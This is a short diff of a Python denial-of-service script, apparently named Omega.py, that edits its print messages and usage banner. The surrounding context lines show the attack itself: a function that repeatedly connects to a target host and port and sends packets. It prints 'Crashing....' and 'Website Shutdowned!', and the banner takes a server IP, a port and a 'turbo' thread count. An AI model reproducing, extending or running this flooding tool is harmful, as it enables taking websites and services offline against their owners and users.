@@ -41,10 +41,10 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94Crashing....\033[0m")
+				print ("\033[92m",time.ctime(time.time()),"Crashing....")
 			else:
 				s.shutdown(1)
-				print("\033[91Website Shutdowned!\033[0m")
+				print("Website Shutdowned!!!")
 			time.sleep(.1)
 	except socket.error as e:
 		print("\033[91\033[0m")
@@ -74,11 +74,11 @@ def usage():
 \____/_/ /_/ /_/\___/\__, /\__,_/  
                     /____/         
     
-	usage : python3 Omega.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135''')
+usage : python3 Omega.py [-s] [-p] [-t]
+-h : help
+-s : server ip
+-p : port default 80
+-t : turbo default 135''')
 	sys.exit()
 
 
@@ -133,7 +133,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
+		print("\033[91mcWrong Ip/Port\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
